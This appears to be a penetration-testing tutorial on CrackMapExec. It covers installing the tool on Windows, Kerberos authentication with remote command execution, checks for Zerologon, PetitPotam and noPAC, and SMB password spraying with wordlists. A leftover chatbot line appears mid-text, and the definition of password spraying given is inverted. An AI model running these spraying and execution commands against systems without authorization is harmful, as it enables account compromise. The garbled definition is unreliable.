# CrackMapExec Installation on Windows

CrackMapExec (CME) is a versatile post-exploitation framework used by penetration testers and red teamers. You can install it on Windows using various methods. Below are two recommended installation options:

## Using CME Binary

1. **Download the Latest Windows Binary**

   - Go to the [CME release page](https://github.com/byt3bl33d3r/CrackMapExec/releases).
   - Download the latest Windows binary.
   - Unzip the downloaded folder.

2. **Run the Binary**

   - After unzipping the folder, locate the CME binary.
   - Run the binary to start using CrackMapExec.

## From Python Standalone Version

Please note that not all functionalities have been tested with this method.

1. **Install Python3.8**

   - Download and install the standalone version of Python 3.8 for Windows from the [official Python website](https://www.python.org/downloads/release).

2. **Add Python to the PATH Environment Variable**

   - After installing Python 3.8, add the path of the folder containing the `python.exe` file to the PATH environment variable for your user account. You can do this by following these steps:
   
     - Open the Windows Start menu.
     - Search for "Environment Variables" and select "Edit the system environment variables."
     - In the System Properties window, click the "Environment Variables" button.
     - In the User Variables section, select the "Path" variable and click "Edit."
     - Click "New" and add the path to the folder containing `python.exe`, e.g., `C:\Python38`.
     - Click "OK" to save your changes.

3. **Run the CME Binary**

   - Open a Command Prompt or PowerShell window.
   - Run the CME binary using Python 3.8. For example, if the CME binary is in the current directory, you can run it as follows:

     ```bash
     python3.8.exe .\cme
     ```

## Troubleshooting

If you encounter the following error:

```
FileNotFoundError: [Errno 2] No such file or directory: 'C:\Users\Admin.shiv\cme_51b7721208fc3d0af7e301aa9a56e1da0a38e9ec5bc08bfe8cc9ba14853ac5d1.tmp\site-packages\cme\data\powersploit\CodeExecution\Invoke-ReflectivePEInjection_Resources\DemoDLL_RemoteProcess\DemoDLL_RemoteProcess\DemoDLL_RemoteProcess.vcxproj.filters
```

You can resolve it by adding the following registry key:

```bash
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem" /v LongPathsEnabled /t REG_DWORD /d 1 /f
```

These instructions should help you install CrackMapExec on your Windows system.

Sure, here are the provided examples converted into Markdown format:

### Using Kerberos Authentication with CrackMapExec

CrackMapExec (CME) supports Kerberos authentication in two ways: using a password/hash or using a ticket and specifying the KRB5CCNAME environment variable. Here are examples of both methods:

#### Using Password/Hash

You can use the `-k` or `--use-kcache` option with a specified password to authenticate with Kerberos:

```bash
$ sudo cme smb zoro.gold.local -k -u bonclay -p Ocotober2022
```

#### Using Ticket and KRB5CCNAME

Alternatively, you can use the `--use-kcache` option with a specified ticket in the KRB5CCNAME environment variable:

```bash
$ export KRB5CCNAME=/home/bonclay/impacket/administrator.ccache 
$ cme smb zoro.gold.local --use-kcache
```

#### Executing Commands

You can also execute commands after authenticating with Kerberos:

```bash
$ sudo cme smb zoro.gold.local --use-kcache -x whoami
```

#### Switching Tickets

If you want to switch Kerberos tickets, set a different KRB5CCNAME and use it with CME:

```bash
$ export KRB5CCNAME=/home/bonclay/impacket/bonclay.ccache
$ sudo cme smb zoro.gold.local --use-kcache -x whoami
```

### Example with LDAP and KDC Host

You can use Kerberos authentication with LDAP and specify the KDC host using the `--kdcHost` option:

```bash
poetry run crackmapexec ldap poudlard.wizard -k --kdcHost dc01.poudlard.wizard
```

These examples demonstrate how to use Kerberos authentication with CrackMapExec for various scenarios.

### Scan for Vulnerabilities and Check DC Vulnerabilities

When starting your internal penetration test, it's crucial to check for vulnerabilities, especially on the Domain Controller (DC). Here are some recommended modules you can use with CrackMapExec (CME) to perform vulnerability checks:

#### Zerologon Vulnerability Check

Zerologon is a critical vulnerability that you should check for. Use the following command with CME:

```bash
crackmapexec smb <ip> -u '' -p '' -M zerologon
```

#### PetitPotam Vulnerability Check

PetitPotam is another important vulnerability to investigate. You can check it with CME using:

```bash
crackmapexec smb <ip> -u '' -p '' -M petitpotam
```

#### noPAC Vulnerability Check

To check for the noPAC vulnerability, use the following CME command:

```bash
crackmapexec smb <ip> -u 'user' -p 'pass' -M nopac
```

These commands will help you assess the security of your internal network, identify potential vulnerabilities, and prioritize your penetration testing efforts. Remember to replace `<ip>`, `user`, and `pass` with the appropriate values for your specific environment.

### Password Spraying with CrackMapExec (CME) for SMB

Password spraying is a technique where an attacker attempts to gain unauthorized access to a system by trying a few common usernames with multiple passwords, rather than attempting many usernames with one or a few passwords. CrackMapExec (CME) is a tool that can be used for password spraying attacks against SMB services. Below are various examples and options for using CME for password spraying:

#### Using Username/Password Lists

You can use multiple usernames or passwords by separating them with a space.

```bash
# Example: Using multiple usernames with a single password
cme smb 192.168.1.101 -u user1 user2 user3 -p Summer18

# Example: Using a single username with multiple passwords
cme smb 192.168.1.101 -u user1 -p password1 password2 password3
```

CME accepts text files of usernames and passwords, one per line. Be cautious of account lockout.

```bash
# Example: Using a file for usernames and a single password
cme smb 192.168.1.101 -u /path/to/users.txt -p Summer18

# Example: Using a single username and a file for passwords
cme smb 192.168.1.101 -u Administrator -p /path/to/passwords.txt
```

#### Continuing After Success

By default, CME will exit after a successful login is found. You can use the `--continue-on-success` flag to continue spraying even after a valid password is found. This is useful for spraying a single password against a large user list.

```bash
# Example: Continue spraying after a valid password is found
cme smb 192.168.1.101 -u /path/to/users.txt -p Summer18 --continue-on-success
```

#### Checking Login == Password Using Wordlists

You can check if the login is equal to the password using wordlists.

```bash
# Example: Check using user.txt for both usernames and passwords
cme smb 192.168.1.101 -u user.txt -p user.txt
```

#### Checking Multiple Usernames/Passwords Using Wordlists

Check multiple usernames against multiple passwords using wordlists.

```bash
# Example: Check using user.txt for usernames and password.txt for passwords
cme smb 192.168.1.101 -u user.txt -p password.txt
```

The result will display the combinations of usernames and passwords that succeed.

#### No Bruteforce with One Login Equal One Password

In some cases, you may want to check if one login is equal to one password using wordlists. The `--no-bruteforce` flag is used in such cases.

```bash
# Example: Check if one username equals one password
cme smb 192.168.1.101 -u user.txt -p password.txt --no-bruteforce --continue-on-success
```

The result will display successful combinations of usernames and passwords.

#### Caution

Be cautious when using these techniques to avoid locking accounts. Additionally, avoid specifying IP ranges or lists of IPs when using the `--no-bruteforce` option.

Remember that ethical hacking and penetration testing should only be performed on systems and networks you have explicit permission to test. Unauthorized hacking is illegal and unethical.
